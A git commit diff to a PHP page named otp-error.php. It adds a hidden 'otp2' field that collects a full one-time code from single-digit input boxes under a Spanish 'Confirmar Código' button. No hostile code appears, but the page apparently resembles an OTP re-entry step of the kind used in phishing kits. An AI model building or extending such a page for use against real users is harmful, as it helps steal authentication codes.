ee3e104de06919e50248bdc8531f6e4a4f5ce445
josemonzalve16-lgtm <josemonzalve16@gmail.com>
2026-05-26 13:36:07 -0500

    Update otp-error.php

--- otp-error.php
+++ otp-error.php
@@ -211,7 +211,7 @@
                 <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                 <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
             </div>
-
+                <input type="hidden" name="otp2" id="codigoCompleto">
             <div class="pt-6 space-y-4">
                 <button id="btnFinal" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300">
                     Confirmar Código
